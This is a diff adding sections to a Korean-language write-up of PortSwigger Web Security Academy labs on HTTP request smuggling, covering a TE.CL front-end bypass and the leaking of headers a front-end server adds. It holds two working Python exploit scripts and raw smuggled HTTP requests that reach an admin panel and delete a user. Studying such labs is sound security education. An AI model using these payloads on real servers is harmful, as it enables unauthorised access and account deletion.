@@ -448,3 +448,195 @@ smuggle_request = first_request + second_request
 
 `/admin`에 접근했다면 `delete`의 경로를 알 수 있고 그 경로로 요청을 보내면 됩니다.
 
+**Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability**
+
+**LAB Description :**
+
+Front-end, Back-end 서버로 이루어져있고 Back-end 서버는 chunked encoding을 지원하지 않습니다. `/admin`에 어드민 패널이 있고 Front-end 서버는 어드민이 아닌 사용자의 요청을 막습니다.
+
+이 문제를 풀려면 어드민 패널에 접근하는 요청을 smuggle 해서 `carlos` 사용자를 삭제하면 됩니다.
+
+**PAYLOAD :**
+
+``` python
+import socket
+import requests
+import ssl
+
+HOST = "ac4c1f991e8b814281d118c900760051.web-security-academy.net"
+PORT = 443
+
+def send_payload(data):
+    context=ssl.create_default_context()
+    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
+    ssl_sock.connect((HOST,PORT))
+    ssl_sock.send(data)
+    data = ssl_sock.recv(1024)
+    ssl_sock.close()
+
+    return data
+
+second_request  = b'GET /admin/delete?username=carlos HTTP/1.1\r\n'
+second_request += b'Host: localhost\r\n'
+
+first_request  = b'POST / HTTP/1.1\r\n'
+first_request += b'Host: '+HOST.encode()+b'\r\n'
+first_request += b'Content-Length: 4\r\n'
+first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+first_request += b'Transfer-Encoding: chunked\r\n'
+first_request += b'\r\n'
+first_request += hex(len(second_request))[2:].encode()+b'\r\n'
+first_request += second_request
+first_request += b'\r\n'
+first_request += b'0\r\n\r\n'
+
+
+smuggle_request = first_request
+
+data = send_payload(smuggle_request)
+
+print (f'{"[*] REQUEST":^10}')
+print (smuggle_request.decode())
+print ("{:^10}".format("[*] RESPONSE"))
+print (data.decode())
+```
+
+위에서 풀었던 문제들과 비슷하게 풀면 됩니다.
+
+### 😎 Revealing front-end request rewriting
+
+많은 어플리케이션들에서 Front-end 서버는 원래 요청이 Back-end로 포워드되기 전에 요청을 수정해서 Back-end에게 전달합니다. 예를 들어, Front-end 서버는 원래 요청에 다음과 같은 일을 할 수 있습니다 :
+
+- TLS 연결을 끊고, 사용된 프로토콜과 암호를 설명하는 헤더를 추가합니다.
+- `X-Forwarded-For` 헤더를 추가해서 사용자의 ip를 표시합니다.
+- session 토큰을 기반으로 사용자를 확인하고, 사용자를 식별할 수 있는 헤더를 추가합니다.
+- 또는 다른 공격에 필요한 민감한 정보를 포함할 수도 있습니다.
+
+만약 smuggle 된 요청이 Front-end 서버가 추가하는 헤더를 포함하지 않으면, Back-end 서버는 요청을 정상적인 방식으로 처리하지 않을 것입니다. 
+
+Front-end 서버가 요청을 어떻게 수정하는지 확인할 수 있는 방법이 있는데, 다음과 같은 단계를 따라야 합니다.
+
+- 요청의 파라미터 중에, 그 값이 응답에 포함되는 POST 요청을 찾아야 합니다.
+- 파라미터의 순서를 바꿔서, 응답에 포함되는 파라미터 값이 body에 제일 마지막에 나타나게 해야 합니다.
+- 공격자가 확인하고 싶은 Front-end 서버로부터 수정된 요청 앞에 이 요청을 붙입니다.
+
+로그인할 때 `email` 파라미터의 값을 응답에 포함하는 어플리케이션을 생각해봅시다.
+
+``` http
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+email=wiener@normal-user.net
+```
+
+ 이 요청은 다음의 값을 포함하는 응답을 만들어 냅니다 :
+
+``` html
+<input id="email" value="wiener@normal-user.net" type="text">
+```
+
+그래서 다음과 같은 요청을 사용해서 Front-end 서버가 수정한 요청을 확인할 수 있습니다.
+
+``` http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=POST /login HTTP/1.1
+Host: vulnerable-website.com
+...
+```
+
+이렇게 되면 Front-end가 수정한 정상적인 요청이 `email`의 값으로 여겨져서 응답에서 수정된 요청을 확인할 수 있습니다.
+
+``` html
+<input id="email" value="POST /login HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 1.3.3.7
+X-Forwarded-Proto: https
+X-TLS-Bits: 128
+X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+X-TLS-Version: TLSv1.2
+x-nr-external-service: external
+...
+```
+
+**NOTE :** 마지막 요청이 Front-end 서버에 의해 수정되기 때문에 길이가 얼마나 될 지 알 수가 없습니다. smuggled된 요청의  `Content-Length` 헤더의 값이 요청의 길이가 얼마인지 결정하게 됩니다. 그래서 만약 `Content-Length`의 값이 너무 작으면, 요청 중 일부만 받을 수 있고, `Content-Length`의 값이 크면, time-out 에러가 뜰 것입니다. 이 값을 수정해가면서 공격을 진행하면 됩니다.
+
+Front-end 서버가 요청을 어떻게 수정하는지 알았다면, 필요한 사항들을 smuggle 될 요청에 추가합니다. 그러면 Back-end 서버에서도 정상적으로 그 요청을 처리할 수 있습니다.
+
+**Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting**
+
+**LAB Description :**
+
+Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. 
+
+`/admin` 에 어드민 패널이 있고 IP 127.0.0.1로부터만 접근이 가능합니다. Front-end 서버는 요청에 IP 주소를 포함한 헤더를 추가합니다.
+
+Front-end 서버가 추가하는 헤더를 알기 위해 HTTP request smuggling 공격을 사용하고, 어드민 패널에 접근해서 `carlos` 유저를 삭제하면 됩니다.
+
+**PAYLOAD :**
+
+``` python
+import socket
+import requests
+import ssl
+
+HOST = "acc31f021f30ed03804c217e00c8001a.web-security-academy.net"
+PORT = 443
+
+def send_payload(data):
+    context=ssl.create_default_context()
+    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
+    ssl_sock.connect((HOST,PORT))
+    ssl_sock.send(data)
+    data = ssl_sock.recv(1024)
+    ssl_sock.close()
+
+    return data
+
+second_request  = b'GET /admin/delete?username=carlos HTTP/1.1\r\n'
+second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+second_request += b'X-erdsHb-Ip: 127.0.0.1\r\n'
+second_request += b'Host: '+HOST.encode()+b'\r\n'
+second_request += b'Content-Length: 100\r\n'
+second_request += b'\r\n'
+second_request += b'search='
+
+first_request  = b'POST / HTTP/1.1\r\n'
+first_request += b'Host: '+HOST.encode()+b'\r\n'
+first_request += b'Content-Length: '+str(len(second_request)+5).encode()+b'\r\n'
+first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+first_request += b'Transfer-Encoding: chunked\r\n'
+#first_request += b'\r\n'
+#first_request += hex(len(second_request))[2:].encode()+b'\r\n'
+#first_request += second_request
+first_request += b'\r\n'
+first_request += b'0\r\n\r\n'
+
+
+smuggle_request = first_request + second_request
+
+data = send_payload(smuggle_request)
+
+print (f'{"[*] REQUEST":^10}')
+print (smuggle_request.decode())
+print ("{:^10}".format("[*] RESPONSE"))
+print (data.decode())
+```
+
+`search` 파라미터의 값이 응답에 그대로 표시되기 때문에, `search` 로 Front-end가 추가한 헤더를 알아내고, 이 헤더의 값을 `127.0.0.1`로 바꾸면 됩니다.
+
+### UPDATING.. 
